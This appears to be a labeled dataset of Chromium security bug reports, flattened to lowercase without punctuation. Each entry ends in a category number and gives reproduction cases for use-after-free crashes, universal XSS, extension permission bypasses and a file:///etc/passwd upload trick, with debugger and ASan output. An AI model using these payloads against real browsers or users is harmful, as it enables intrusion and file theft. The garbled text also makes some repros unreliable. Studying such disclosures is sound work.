looks like a stale frame in userscriptslave injectscripts john this might be coming from your change at can you please take a look or help with an owner testcase script function test var w window.open about blank var f w.document.adoptnode document.getelementsbytagname iframe 0 w.document.body.appendchild f w.close script body onload test iframe src data text/html foo stacktrace 0 in userscriptslave injectscripts webkit webframe userscript runlocation 1 in userscriptidlescheduler mayberun 2 in messageloop runtask task 3 in messageloop deferorrunpendingtask messageloop pendingtask const 4 in messageloop dodelayedwork base timeticks 5 in base messagepumpdefault run base messagepump delegate 6 in messageloop runinternal 7 in messageloop run 8 in base thread threadmain	9
bypass extensions permission app launch web_url should not allow javascript chrome javascript alert document.domain chrome newtab chrome appcache-internals xss	2
webcore inspectorbackenddispatcher runtime_evaluate user after free test chrome 12.0.742.5 dev chromium 12.0.737.0 81713 1 goto 2 shift+ctrl+j open devtools 3 showmodaldialog data text/html script settimeout close 10000 3c/script n 4 click address bar 5 ctrl+r repeat	11
stale observer in browsingdataremover s observer_list vulnerability details reloading a page with a certain type/amount of cookies crashes chrome while erasing history google chrome goes down completely when the steps below are carried out it seems that the way some sites use cookies prevents the history erase process from completing once the tab is closed the process may still access the cookies in use by the site once this site is reloaded chrome crashes completely version chrome version 11.0.696.65 stable operating system windows xp sp3 ubuntu 11.04 reproduction case 1 start google chrome with 1 tab do n't load previously closed tabs 2 load www.twitter.com/google has something to do with the way twitter and some other sites handles cookies 3 launch customize and control google chrome history edit items clear all browsing data 4 check all checkboxes and select beginning of time from the combobox 5 press the clear browsing data button and wait for a while does not close 6 press cancel 7 now press the clear browsing data button brings up the dialog again and press the clear browsing data button and leave it running 8 close the options under the hood tab while the clear browsing data dialog/process still runs 9 now reload the www.twitter.com/google page from the first tab 10 full browser crash with 11.0.696.65 i did not include extra crash information because i think that this crash is not difficult to reproduce i d be happy to do so if necessary	11
use-after-free in imageloader with fallbackcontent vulnerability details use-after-free version chrome version all win 7 11.0.696.65 official build 84435 linux x64 13.0.759.0 developer build 84563 ubuntu 11.04 osx 10.6 snow leopard 11.0.696.65 reproduction case only works from a server and the referenced files should exist but not have a reasonable mimetype for example touch lol.wut should work object type image/jpeg data aaaaaaa/lol.wut object type image/jpeg data aaaaaaa/lol.wut test url for crashes please include the following additional information type of crash sad tab crash state address is 8 bytes inside a block of size 40 free d at free vg_replace_malloc.c:913 by webcore htmlobjectelement renderfallbackcontent address is not stack d malloc d or recently free d general protection fault at webcore imageloader updatefromelement	11
an extension can access and modify all chrome pages options etc vulnerability details an packaged app/extension can access and modify all chrome pages read/write preferences run chrome.send function pass arguments directly to c without required permissions without using npapi plugin content script or chrome.tabs.executescript version chrome version 11.0.696.68 stable 12.0.742.53 beta 13.0.767.1 dev operating system ms windows vista home premium edition service pack 2 build 6002 most likely affect all os reproduction case 1 add the following permissions in an app/extension manifest permissions tabs all_urls 2 call from any extension script chrome.tabs.create url chrome downloads function tab oncomplete wait when tab is complete chrome.tabs.update tab.id url javascript document.stylesheets 0 addrule color red complete code hotcleaner_alpha_test.crx look at bg.html line 44-57	2
universal xss using contentwindow.eval testcase here s the uxss variation that does n't use execscript script i document.body.appendchild document.createelement iframe f i.contentwindow.eval function location javascript alert location i.src i.onload f script	5
oob read with flash vulnerability details flash actionscript provide a ways to interact between the browser and the flash applet with the externalinterface class test.as private function init e event null void make the method callme available to the browser externalinterface.addcallback callme this.callme public function callme input string string return input a problem was first observe when were pass to the function made public it then become vulnerable when passing swf.callme x0000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa the value receive from the method callme now include what seems to be arbitrary memory data note i have not debug it to understand the internals it seems to be reading the values following the string with the initial length severity high base on version chrome version 12.0.712.0 dev operating system windows xp reproduction case see flash.zip the poc test.htm call the method with various size of string with minimal tests i was able to see data from another iframe see the amazon session being expose in the screen additional information ie7 is not affect by this problem ff seems to have limited exposure only few bytes can be overflow max in the flash.zip the test.as can be recompile quickly with flashdevelop org hope i m eligible to vulnerability reward program	11
use-after-free in svg fontfacelement vulnerability details use-after-free in svg fontfaceelement n.b i can only reproduce this 2 ways 1 in linux when i disable tcmalloc with build/gyp_chromium dlinux_use_tcmalloc=0 2 in valgrind where it affects also google chrome stable version valgrind gives the same results on non-tcmalloc chromium trunk google chrome 11 stable and regular tcm ubuntu chromium daily version chrome version trunk with tcmalloc turned off d operating system linux 2.6.38-9-generic 43-ubuntu smp thu apr 28 15:23:06 utc 2011 x86_64 reproduction case attached for crashes please include the following additional information type of crash tab address is 88 bytes inside a block of size 1,424 free d address is not stack d malloc d or recently free d at webcore cssstyleselector popparent webcore element	11
parsing issue with webkit-calc vulnerability details the following is badly parsed a style webkit-box-reflect above 1px webkit-calc 1 version chrome version beta and daily not stable google chrome 12.0.742.77 official build 87574 beta webkit 534.30 branches/chromium/742 87761 chromium 14.0.786.0 developer build 87939 ubuntu 11.04 os linux webkit 535.1 trunk 88122 operating system ubuntu 64bits reproduction case a style webkit-box-reflect above 1px webkit-calc 1 for crashes please include the following additional information type of crash renderer crash state address is not stack d malloc d or recently free d process terminating with default action of signal 11 sigsegv general protection fault zn7webcorel17equalignoringcaseerkns_15cssparserstringepkc.clone.5 cssparser.cpp:144 webcore cssparser isgeneratedimagevalue webcore cssparservalue const cssparser.cpp:5542	11
renderer crash with javascript setinterval vulnerability details a fuzzed js1k entry causes a nasty-looking renderer crash this happens at least on 64-bit linux i could n't reproduce the crash in 32-bit debian i do n't have a 64-bit ubuntu at hand for a debug build submitting just the partially minimized plain crash for now to make sure this is spotted before the next stable version chrome version 12.0.742.91 official build 87961 beta and dev operating system linux debian 6.0.1 x86_64 reproduction case 1 google-chrome x.html x.html x.html x.html x.html x.html 2 at least one tab probably crashes for crashes please include the following additional information type of crash tab crash state program received signal sigsegv segmentation fault in gdb bt 0 in 1 in 2 in gdb x/10i rip mov r15 r14,8 r15 cmp r13 r15 je test r15b je mov r10 cmp r10 r15 jne mov r15 rax mov r15 r15 gdb i r rax 140737087414121 rbx 0 rcx 751619276800 rdx 175 rsi 140737082556481 rdi 140737086912681 rbp rsp r8 751619276800 r9 4294967295 r10 140736545015113 r11 0 r12 4294967296 r13 61727456 r14 4294967295 r15 140737086912681 rip eflags pf sf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 fctrl 895 fstat 0 ftag 65535 fiseg 0 fioff 0 foseg 0 fooff 0 fop 0 mxcsr ie ze pe im dm zm om um pm	9
use-after-free in webcore rendertextcontrol isselectableelement vulnerability details textarea crash version chrome version r86329 onwards it s a webkit roll 87065:87089 pretty sure it s webkit r87067 operating system linux osx reproduction case textarea id a textarea textarea id b textarea script a.selectionstart 0 b.style.display none b.selectionstart 0 script for crashes please include the following additional information type of crash renderer crash state at by webcore rendertextcontrol isselectableelement webcore node const by webcore rendertextcontrol indexforvisibleposition webcore visibleposition const const	11
use after free in webcore containernode parseraddchild vulnerability details buffer overflow version chrome version google chrome 11.0.696.77 official build 87952 webkit 534.24 branches/chromium/696 86868 chromium 14.0.786.0 developer build 87944 ubuntu 11.04 os linux webkit 535.1 trunk 88122 operating system ubuntu 64bit osx reproduction case attached for crashes please include the following additional information type of crash renderer crash state address is 0 bytes inside a block of size 120 free d address is not stack d malloc d or recently free d general protection fault webcore containernode parseraddchild wtf passrefptr webcore node containernode.cpp:686 vg logs attached for chromium and google chrome	9
use after free in svguseelement buildshadowtree version chrome version stable daily operating system osx linux reproduction case svg g use xlink href g g g id g script document.body.innertext script for crashes please include the following additional information type of crash renderer crash state address is 40 bytes inside a block of size 384 free d address is not stack d malloc d or recently free d at webcore node dispatchsubtreemodifiedevent document.h:886 by webcore containernode appendchild	11
should we reconsider the no-client-ui decision for the web store context android had a bad security bug where you xss on their gallery led to install on local machine we can have the same issue on our store because we have no client ui in that case we do mitigate this issue today by forcing a user gesture and we also force the client ui in the case of npapi for background the reason we do this crazy thing is that we wanted to have a nice integrated purchase flow where you only do one confirmation for both money and security not two separate dialogs	9
invalid access with bad html this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details please provide a brief explanation of the security issue version chrome version all operating system all reproduction case attached for crashes please include the following additional information type of crash tab crash state gdb x/i rip webcore renderblock createlineboxes webcore renderobject bool webcore inlinebox 106 testb rax gdb p/x rax 1	9
http basic auth realm spoof test chrome 12.0.733.0 dev windows xp sp3	1
the page that you re looking for used information that you entered returning to that page will cause crash chrome version 14.0.792.0 official build 88960 canary os windows 7 crash id a5ab51b83fa1400d d29765dcdb0492dd 8d37622c37e1d654 url if applicable where crash occurred can you reproduce this crash what steps will reproduce this crash or if it s not reproducible what were you doing just before the crash 1 go to 2 in the upper left corner of the page type any words in the box next to quick search click go 3 after the page of the search resaults is loaded press f5 to reload the page 4 a message box will pop up saying the page that you re looking for used information that you entered returning to that page might cause any action you took to be repeated do you want to continue 5 as soon as the message box pops up chrome crashes please note that issues filed with no information filled in above will be marked as wontfix	11
security dropping file urls into gmail grants access to files vulnerability details 1 create a link of the form a href file etc/passwd 2 drag that link into e.g a gmail message the file is uploaded the problem in case it s not obvious is that this drag can be spoofed dragging a file from the desktop should work dragging a url should not grant access to that file version chrome version 12.0.742.0 official build 82248 dev operating system linux	2
browser prompt when installing unpacked npapi extensions currently we do not prompt when you use the interface on chrome extensions to load an unpacked extension that contains an npapi plugin we should add the browser prompt to this case as a defense in depth measure against things like	9
extensions permission elevevation using javascript in homepage_url test chrome 13.0.772.0 windows xp sp3 1 install testcase.crx 2 goto chrome extensions 3 clickme another bad extension will been load	9
security web page can initiate speech recognition without user knowing about it vulnerability details web page can start speech recognition whenever user clicks anything on web page the problem is that chromium relies on a popup showing that recognition is started that popup can be moved to be outside the screen version chrome version 13.0.772.0 dev operating system fedora 15 the problem happens at least also on osx but the testcase may need some tweaking to work with all the screen resolutions for testing removing opacity 0.0 can be useful	9
flash/gpu memory corruption in critical section test chrome 13.0.782.1 windows 7 sp1 install testcase.crx 950.768 access violation code c0000005 second chance eax=054edf80 ebx=00000000 ecx=055b9f08 edx=0065ac40 esi=06ddf9f0 edi=0037ef38 eip=0065ac40 esp=0037ee5c ebp=005d5140 iopl=0 nv up ei pl nz na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210206 0065ac40 80726600 xor byte ptr edx+66h 0 ds:002b:0065aca6=65 0:000 exr 1 exceptionaddress 0065ac40 exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000008 parameter 1 0065ac40 attempt to execute non-executable address 0065ac40 98c.594 access violation code c0000005 second chance eax=795475f9 ebx=00000000 ecx=795475f5 edx=02630c80 esi=795475f9 edi=795475f5 eip=772622c2 esp=002befa0 ebp=002befb4 iopl=0 nv up ei pl nz ac po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010212 ntdll rtlentercriticalsection 772622c2 f00fba3000 lock btr dword ptr eax 0 ds:002b:795475f9 0:000 exr 1 exceptionaddress 772622c2 ntdll rtlentercriticalsection exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000001 parameter 1 795475f9 attempt to write to address 795475f9 bc.524 access violation code c0000005 second chance eax=00000010 ebx=00000000 ecx=0602db28 edx=05fa4750 esi=05fa4750 edi=0018f5cc eip=6dd0e381 esp=0018f450 ebp=005b5140 iopl=0 nv up ei pl nz na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206 chrome_6cce0000 crashuploadlist informdelegateofcompletion 6dd0e381 8b10 mov edx dword ptr eax ds:002b:00000010 0:000 exr 1 exceptionaddress 6dd0e381 chrome_6cce0000 crashuploadlist informdelegateofcompletion exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000000 parameter 1 00000010 attempt to read from address 00000010	11
web inspector crash by buffer overrun crash when serializing inspector object tree	11
chrome_1c30000 webkit ppapi ppb_widget_impl invalidate crash test chrome 13.0.782.14 windows xp sp3 open testcase.htm a40.c74 access violation code c0000005 second chance eax=019de64d ebx=056fa870 ecx=0117e154 edx=026632f7 esi=056fa870 edi=056fa8a4 eip=31018300 esp=0012f7f8 ebp=0012f84c iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 31018300 0:000 exr 1 exceptionaddress 31018300 exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000008 parameter 1 31018300 attempt to execute non-executable address 31018300 460.c0c access violation code c0000005 second chance eax=077d36e0 ebx=011e9b40 ecx=011e9b40 edx=026632f7 esi=011e9b40 edi=011e9b74 eip=0265a711 esp=0012f804 ebp=0012f84c iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 chrome_1c30000 webkit ppapi ppb_widget_impl invalidate 0265a711 8b4008 mov eax dword ptr eax+8 ds:0023:077d36e8 0:000 exr 1 exceptionaddress 0265a711 chrome_1c30000 webkit ppapi ppb_widget_impl invalidate exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000000 parameter 1 077d36e8 attempt to read from address 077d36e8	11
use after free due to floats not cleared from parent s next siblings blocks on losing ability to intrude floats vulnerability details html parsing bad rip version chrome version all operating system all reproduction case attached for crashes please include the following additional information type of crash renderer crash state bad permissions for mapped region at address at by webcore renderblock addoverflowfromfloats renderblock.h:508 by webcore renderblock computeoverflow int bool renderblock.cpp:1367 error addresssanitizer crashed on unknown address at pc bp sp addresssanitizer can not provide additional info aborting	11
heap memory corruption in web database support sqlite/icu vulnerability details the regular expression engine of icu used by chrome is prone to a heap memory corruption bug when processing certain regular expressions this bug can be triggered in chrome via web sql database support which is backed by sqlite that use icu s regular expression engine to support regexp operator in sql statements version the issue has been reproduced in the following browser/os combinations chrome 12.0.742.100 ubuntu 10.04 lts chromium 14.0.798.0 developer build 89782 linux ubuntu 10.04 lts reproduction case for reproduction in the browser load the attached testcase.htm in chrome and this should result in a sad tab if not refresh a few times if the browser is started under gdb and single process mode is used the output should look like the following gdb chrome-linux/chrome gnu gdb gdb 7.1-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as i486-linux-gnu for bug reporting instructions please see reading symbols from home/yang/desktop/chrome-linux/chrome no debugging symbols found done gdb set args single-process gdb r starting program home/yang/desktop/chrome-linux/chrome single-process thread debugging using libthread_db enabled new thread lwp 2419 new thread lwp 2420 new thread lwp 2421 new thread lwp 2422 new thread lwp 2423 new thread lwp 2424 new thread lwp 2426 new thread lwp 2425 new thread lwp 2427 new thread lwp 2428 new thread lwp 2429 2414:2425:481172553 error proxy_service_factory.cc 66 can not use v8 proxy resolver in single process mode new thread lwp 2430 new thread lwp 2431 2414:2425:481696581 error proxy_service_factory.cc 66 can not use v8 proxy resolver in single process mode new thread lwp 2433 new thread lwp 2434 new thread lwp 2435 new thread lwp 2436 new thread lwp 2437 2414:2425:485943140 error histogram.cc 283 error deserializing histogram unknown histogram_type 3 thread lwp 2436 exited 2414:2425:486560523 error histogram.cc 283 error deserializing histogram unknown histogram_type 3 new thread lwp 2438 program received signal sigsegv segmentation fault switching to thread lwp 2425 in tcmalloc centralfreelist fetchfromspans gdb to better illustrate this issue compile the attached icu_test.cpp and link against icu 4.6 run the executable and the output should look like g o icu_test i usr/local/include icu_test.cpp licuuc licui18n icu_test.cpp:10:23 warning trigraph ignored use trigraphs to enable icu_test glibc detected icu_test realloc invalid next size backtrace lib/tls/i686/cmov/libc.so.6 lib/tls/i686/cmov/libc.so.6 lib/tls/i686/cmov/libc.so.6 realloc usr/local/lib/libicuuc.so.46 uprv_realloc_46 usr/local/lib/libicuuc.so.46 zn6icu_469uvector6414expandcapacityeir10uerrorcode usr/local/lib/libicui18n.so.46 zn6icu_4612regexmatcher9statesaveepns_12restackframeexr10uerrorcode usr/local/lib/libicui18n.so.46 zn6icu_4612regexmatcher12matchchunkateiar10uerrorcode usr/local/lib/libicui18n.so.46 zn6icu_4612regexmatcher7matchesexr10uerrorcode usr/local/lib/libicui18n.so.46 uregex_matches64_46 usr/local/lib/libicui18n.so.46 uregex_matches_46 icu_test lib/tls/i686/cmov/libc.so.6 libc_start_main icu_test memory map btw this issue is not specific to icu 4.6 it still exits in the trunk of icu as of jun 16 2011	11
use after free due to floats not removed vulnerability details more floats version chrome version webkit r89189 and all others operating system all reproduction case attached for crashes please include the following additional information type of crash renderer crash state jump to the invalid address stated on the next line at by webcore renderblock addoverflowfromfloats	11
use after free due to refcounting issue in mediaquerymatcher prepareevaluator vulnerability details not sure if this is a real bug but reporting anyhow as per twitter w scarybeasts use-after-free invalid read does n't crash the regular browser just valgrind and asan version chrome version stable trunk operating system linux reproduction case iframe id i iframe script type application/javascript var iframe document.getelementbyid i var obj iframe.contentwindow.matchmedia min-width 0em script for crashes please include the following additional information type of crash renderer with asan or vg crash state 20062 error addresssanitizer crashed on address at pc bp sp read of size 8 at thread t0 0 in webcore cssprimitivevalue computelengthdouble home/user/asan/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:60 1 in webcore cssprimitivevalue computelength int home/user/asan/src/third_party/webkit/source/webcore/css	11
oob read due to iterating over wrong textbox in textiterator emittext first-letter rtl vulnerability details direction rtl first-letter style non-letter character as first letter followed by stuff then a left-to-right-override leads to an out of bounds read version chrome version stable trunk operating system linux 64bit reproduction case html style direction rtl style body first-letter color black style aaa x202e the out-of-boundness is easily controllable between 0 and 128 bytes for crashes please include the following additional information type of crash asan/vg renderer crash state is located 0 bytes to the right of 36-byte region valgrind is confused about the semantics of the read asan gives nicer results d	11
xss injection via prototype chain chrome version 12.0.742.100 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 4.x ie 7/8/9 cross-domain iframe able to inject arbitrary function in window.location prototype and call by main page what steps will reproduce the problem 1 make a page in doctype html html head meta charset utf-8 title title script type text/javascript function onload console.log fun in location fun in window.location console.log fun in document fun in document if fun in window.location console.log window.location.fun script head body onload onload iframe width 100 height 100 src iframe body html 2 make another page in which inject doctype html html head meta charset utf-8 script type text/javascript make sure touch top window location first get the hook to inject function window.top.location inject cross domain function via object.prototype object.prototype.fun function return from iframe window.location inject cross domain function via location.__proto window.location.__proto__.fun function return from iframe window.location script head body body html 3 browse what is the expected result console log fun in location true index01.html:10'fun in document false index01.html:12from iframe what happens instead console log fun in location false index01.html:10'fun in document false please provide any additional information below attach a screenshot if possible	2
use after free in third_party/webkit/layouttests/fast/dom/htmllinkelement/link-and-subresource-test.html this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details please provide a brief explanation of the security issue version chrome version chromium 14.0.805.0 developer build 90701 ubuntu 11.04 webkit 535.1 trunk 89816 not affected beta stable operating system linux 64bit reproduction case link rel prefetch href resources/nick.jpg onload nick_onload img src resources/nick.jpg onload nick_onload or third_party/webkit/layouttests/fast/dom/htmllinkelement/link-and-subresource-test.html nick.jpg is not required to exist for crashes please include the following additional information type of crash asan/vg crash state invalid read of size 4 at webcore cachedresource stoploading cachedresource.h:184 by webcore cachedresourcerequest didfail webcore subresourceloader webcore resourceerror const cachedresourcerequest.cpp:200 address is 24 bytes inside a block of size 920 free d at free vg_replace_malloc.c:913 by webcore cachedresource unregisterhandle webcore cachedresourcehandlebase cachedresource.cpp:520 by webcore cachedresourcehandlebase setresource webcore cachedresource cachedresourcehandle.cpp:36	11
chrome-devtools can be navigated from http vulnerability details the chrome dev tools is iframe-able version chrome version 14.0.803.0 dev-m works on 13 as well operating system windows 7 and linux 11 reproduction case	2
use after free in range extract contents vulnerability details use-after-free version chrome version stable trunk operating system linux 64bit vg/asan seems to be required would n't crash on canary on windows reproduction case attached for crashes please include the following additional information type of crash renderer asan/vg crash state address is 48 bytes inside a block of size 120 free d address is not stack d malloc d or recently free d at webcore node nodeindex const node.cpp:2844 is located 72 bytes inside of 120-byte region i could n't get asan to show symbols even though the binary takes 3 gigs and asan_options is unset sorry	11
the beforeload event allows tracking uri changes in a frame vulnerability details the beforeload event allows a website to track uri changes that happen inside a frame by abusing this property an attacker could gain access to sensitive information and security tokens enabling further csrf-style attacks version chrome version 14.0.803.0 dev operating system ubuntu 10.04 lts reproduction case the code below opens a google redirection page in an iframe the onbeforeload event attribute is used to detect the url changes iframe src continue=https 3a 2f 2fchrome.google.com 2fwebstore 2f onbeforeload alert now opening event.url iframe	2
use-after-free in frameloader with no form post method vulnerability details use-after-free version chrome version stable trunk operating system linux 64bit reproduction case src/third_party/webkit/layouttests/fast/events/form-iframe-target-before-load-crash.html minus method post 4c4 form id form1 style display none target test action form form id form1 style display none method post target test action form attached for crashes please include the following additional information type of crash renderer crash state invalid read of size 8 at webcore frameloader loadurl address is 744 bytes inside a block of size 2,344 free d invalid write of size 1 at webcore frameloader loadurl address is not stack d malloc d or recently free d	11
stale pointer due to floats not removed flexible box display vulnerability details under certain circumstances chromium will crash due to a stale pointer in webcore renderblock marginbeforeforchild this seems very similar to bug 82546 version chrome version chromium 12.0.742.112 ubuntu 11.04 google chrome 14.0.803.0 dev operating system ubuntu 11.04 64-bit reproduction case script type text/javascript function boom settimeout document.getelementbyid div appendchild document.getelementbyid blockquote 0 settimeout t document.getelementbyid div t.parentnode.removechild t 24 settimeout window.location.reload 100 window.onload boom script div style display webkit-box div id div span style float right iwqapbqaglwbksrzvwltykdlwmlqteulnlrpfmqiasljdqiutiqukahravtbflaagbradguoey span span a span div span ol blockquote id blockquote 772523749 blockquote ol span div for crashes please include the following additional information type of crash tab chromium-browser debug single-process crash.html gdb run program received signal sigsegv segmentation fault switching to thread lwp 23753 in webcore renderblock marginbeforeforchild this value optimized out child at third_party/webkit/source/webcore/rendering/renderblock.cpp:6103 6103 third_party/webkit/source/webcore/rendering/renderblock.cpp no such file or directory in third_party/webkit/source/webcore/rendering/renderblock.cpp gdb bt 0 in webcore renderblock marginbeforeforchild this value optimized out child at third_party/webkit/source/webcore/rendering/renderblock.cpp:6103 1 in ypositionforfloatincludingmargin this paintinfo tx=8 ty=8 preservephase=false at third_party/webkit/source/webcore/rendering/renderblock.h:487 2 webcore renderblock paintfloats this paintinfo tx=8 ty=8 preservephase=false at third_party/webkit/source/webcore/rendering/renderblock.cpp:2564 3 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderblock.cpp:2498 4 in webcore renderblock paint this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderblock.cpp:2264 5 in webcore renderblock paintchildren this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderblock.cpp:2417 6 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at third_party/webkit/source/webcore/rendering/renderblock.cpp:2484 7 in webcore renderblock paint this paintinfo tx=8 ty=8 gdb disas dump of assembler code for function webcore renderblock marginbeforeforchild webcore renderboxmodelobject const 0 mov rdi rax 4 movzbl rax eax 8 shr al 11 and eax 14 cmp eax 17 je webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+80 19 cmp eax 22 je webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+64 24 cmp eax 27 je webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+48 29 mov rsi rax 32 mov rsi rdi 35 mov rax rax 42 jmpq rax 44 nopl rax 48 mov rsi rax 51 mov rsi rdi 54 mov rax rax 61 jmpq rax 63 nop 64 mov rsi rax 67 mov rsi rdi 70 mov rax rax 77 jmpq rax 79 nop 80 mov rsi rax 83 mov rsi rdi 86 mov rax rax 93 jmpq rax end of assembler dump gdb i r rax 0 rbx 140737367076072 rcx 8 rdx 8 rsi 140737367075000 rdi 140737367075000 rbp rsp r8 0 r9 84 r10 8 r11 8 r12 140737372229632 r13 140737370838800 r14 0 r15 8 rip webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+35 eflags cf pf af sf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb print child m_node 1 webcore eventtarget vptr.eventtarget webcore treeshared webcore containernode vptr.treeshared m_refcount 0 m_parent webcore scriptwrappable m_wrapper m_document m_previous m_next m_renderer m_nodeflags 5767228 gdb	11
memory corruption double free caused by malformed xpath expression in xslt vulnerability details a memory corruption double free bug has been identified in libxml2 s xpath engine which can be triggered in chrome/chromium via a malformed xpath expression in xsl transformation this bug is due to improper error handling of invalid xpath expressions much like the one described in issue 63444 one example of such expression is book author count count 2 10 1 when this expression is processed by libxml2 an error is detected and the code moves on to error handling code popping up remaining values in the value table of the xpath parser context freeing unnecessary xpath objects etc however in this process the context object is free ed twice once in xmlxpathcompopevalpositionalpredicate of xpath.c 11843 evaluation_exit 11844 if contextobj null 11845 if ctxt value contextobj 11846 valuepop ctxt 11847 xmlxpathreleaseobject xpctxt contextobj first free 11848 11849 if exprres null 11850 xmlxpathreleaseobject ctxt context exprres the other in xmlxpathevalexpression of xpath.c 14964 do 14965 tmp valuepop pctxt 14966 if tmp null 14967 xmlxpathreleaseobject ctxt tmp second free of the same object or more precisely address memory corrupted 14968 stack 14969 14970 while tmp null 14971 if stack 0 res null 14972 xmlgenericerror xmlgenericerrorcontext 14973 xmlxpathevalexpression d object left on the stack\n 14974 stack 14975 14976 xmlxpathfreeparsercontext pctxt 14977 return res 14978 version chrome 12.0.742.122 windows xp sp3 chromium 14.0.823.0 developer build 92629 windows xp sp3 chromium 14.0.823.0 developer build 92644 linux ubuntu 10.04 lts reproduction case please see the attached files repro.html demo.xml and demo.xsl put them in the same web directory load repro.html in the browser and a sad tab would show up	7
cross application unsafe redirect vulnerability details in the case of chrome as the browser default is possible to perform unsafe redirect from zone http to zone file version chrome version 9.0.597.94 stable operating system winxp x64 sp2 winxp x32 sp3 win7 reproduction case 1 click from any application i.e adobe reader not embedded or googletalk/icq on the link like this you see page like file c documents 20and 20settings/administrator/local 20settings/application 20data/google/chrome/application/9.0.597.94 but it does not work out for the application directory through logical things like these 2 i spent a lot of strength while searching for a way to open any file on the disk but this method has been found it is based on deception these link a boot.ini from gtalk/icq/reader will open file c boot.ini this can be used to steal local files and transfer them to a remote server it s enough to get into the chrome downloads directory html formatted file and swf file then this vulnerability is to be used for opening the that local html formatted file	9
regression 83075 use after free in line box culling optimization just found this and i m dumping it before the weekend starts in mtv in case somebody has time to have a look i m rebuilding chrome and it s after work hours so i wo n't look at this myself until monday repro head script function f document.designmode on document.execcommand selectall document.execcommand insertimage false document.execcommand insertimage false document.execcommand indent document.execcommand insertunorderedlist false document.execcommand insertunorderedlist false document.execcommand bold document.execcommand insertlinebreak document.execcommand insertunorderedlist document.execcommand insertimage false document.execcommand insertparagraph false document.execcommand insertunorderedlist document.execcommand insertunorderedlist document.execcommand outdent script head body onload f pre id x x pre body head script function f document.designmode on document.execcommand selectall document.execcommand insertimage false document.execcommand insertimage false document.execcommand indent document.execcommand insertunorderedlist false document.execcommand insertunorderedlist false document.execcommand bold document.execcommand insertlinebreak document.execcommand insertunorderedlist document.execcommand insertimage false document.execcommand insertparagraph false document.execcommand insertunorderedlist document.execcommand insertunorderedlist document.execcommand outdent script head body onload f pre id x x pre body id chrome.dll webcore requireslinebox execav arbitrary a1b2d0b7782629a1c77ca95cb118a6fb description security attempt to execute non-executable arbitrary memory in chrome.dll webcore requireslinebox note based on this information this is expected to be a security issue stack chrome.dll webcore requireslinebox chrome.dll webcore renderblock skipleadingwhitespace chrome.dll webcore renderblock findnextlinebreak chrome.dll webcore renderblock layoutrunsandfloats chrome.dll webcore renderblock layoutinlinechildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderblock layoutblockchild chrome.dll webcore renderblock layoutblockchildren chrome.dll webcore renderblock layoutblock chrome.dll webcore renderblock layout chrome.dll webcore renderview layout chrome.dll webcore frameview layout chrome.dll webcore document updatelayout chrome.dll webcore document updatelayoutignorependingstylesheets chrome.dll webcore visibleposition canonicalposition chrome.dll webcore visibleposition init chrome.dll webcore visibleposition visibleposition chrome.dll webcore visibleselection setbaseandextenttodeepequivalents chrome.dll webcore visibleselection validate chrome.dll webcore visibleselection visibleselection chrome.dll webcore deleteselectioncommand doapply chrome.dll webcore editcommand apply chrome.dll webcore compositeeditcommand applycommandtocomposite chrome.dll webcore compositeeditcommand deleteselection chrome.dll webcore compositeeditcommand moveparagraphs chrome.dll webcore indentoutdentcommand outdentparagraph chrome.dll webcore indentoutdentcommand outdentregion chrome.dll webcore applyblockelementcommand doapply chrome.dll webcore editcommand apply chrome.dll webcore applycommand chrome.dll webcore executeoutdent chrome.dll webcore editor command execute chrome.dll webcore document execcommand chrome.dll webcore documentinternal execcommandcallback chrome.dll v8 internal handleapicallhelper chrome.dll v8 internal builtin_handleapicall chrome.dll v8 internal invoke chrome.dll v8 internal execution call chrome.dll v8 script run	11
